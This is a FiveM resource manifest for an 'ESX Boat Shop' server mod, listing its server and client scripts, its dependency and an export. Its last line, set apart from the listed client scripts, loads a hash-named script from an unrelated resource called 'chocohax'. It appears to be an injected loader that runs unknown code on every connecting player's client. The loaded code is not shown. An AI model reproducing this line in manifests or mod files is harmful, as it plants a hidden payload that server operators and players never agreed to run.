resource_manifest_version '44febabe-d386-4d18-afbe-5e627f4af937'

description 'ESX Boat Shop'

version '1.1.0'

server_scripts {
	'@mysql-async/lib/MySQL.lua',
	'@es_extended/locale.lua',
	'locales/en.lua',
	'config.lua',
	'server/main.lua'
}

client_scripts {
	'@es_extended/locale.lua',
	'locales/en.lua',
	'config.lua',
	'client/utils.lua',
	'client/main.lua'
}

dependency 'es_extended'

export 'GeneratePlate'
client_script '@chocohax/3a8edc97804897d949f78eac09528d6204ce579e0a.lua'